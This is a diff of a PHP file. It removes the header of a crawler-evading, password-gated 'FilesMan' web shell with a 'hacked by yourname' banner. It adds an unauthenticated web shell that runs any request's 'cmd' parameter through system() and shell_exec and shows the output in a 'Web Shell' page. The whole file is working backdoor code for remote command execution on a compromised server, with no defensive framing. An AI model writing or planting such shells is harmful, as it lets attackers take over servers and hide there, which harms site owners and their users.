@@ -1,75 +1,114 @@
 <?php
-session_start();
-error_reporting(0);
-set_time_limit(0);
-@set_magic_quotes_runtime(0);
-@clearstatcache();
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
-
-$auth_pass = "098f6bcd4621d373cade4e832627b4f6"; // default: test
-$color = "#00ff00";
-$default_action = 'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
-    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
-    }
+if(isset($_REQUEST['cmd'])) {
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+} else {
+echo "Attack successful, Proceed Cautiously?";
 }
-
-function login_shell() {
+?><?php
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec($_POST['cmd']);
+}
 ?>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<style type="text/css">
-html {
-	margin: 20px auto;
-	background: #000000;
-	color: green;
-	text-align: center;
-}
-header {
-	color: green;
-	margin: 10px auto;
-}
-input[type=password] {
-	width: 250px;
-	height: 25px;
-	color: red;
-	background: #000000;
-	border: 1px dotted green;
-	padding: 5px;
-	margin-left: 20px;
-	text-align: center;
-}
-</style>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web Shell</title>
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            color: rgba(0, 0, 0, .75);
+        }
+
+        main {
+            margin: auto;
+            max-width: 850px;
+        }
+
+        pre,
+        input,
+        button {
+            border-radius: 5px;
+        }
+
+        pre,
+        input,
+        button {
+            background-color: #efefef;
+        }
+
+        label {
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background-color: #efefef;
+            border: 2px solid transparent;
+        }
+
+        input:focus {
+            outline: none;
+            background: transparent;
+            border: 2px solid #e6e6e6;
+        }
+
+        button {
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        button:hover {
+            background-color: #e6e6e6;
+        }
+
+        pre,
+        input,
+        button {
+            padding: 10px;
+        }
+
+        .form-group {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            padding: 15px 0;
+        }
+    </style>
+
 </head>
-<center>
-<header>
-	<pre>
- ______________________________________
 
-<hacked by yourname >
-______________________________________
+<body>
+    <main>
+        <h1>Web Shell</h1>
+        <h2>Execute a command</h2>
 
-	</pre>
-</header>
-<form method="post">
-<input type="password" name="pass">
-</form>
-<?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    else
-        login_shell();
-}
-?>
+        <form method="post">
+            <label for="cmd"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+            <h2>Output</h2>
+            <?php if (isset($cmd)): ?>
+                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+            <?php endif; ?>
+        <?php endif; ?>
+    </main>
+</body>
+</html>
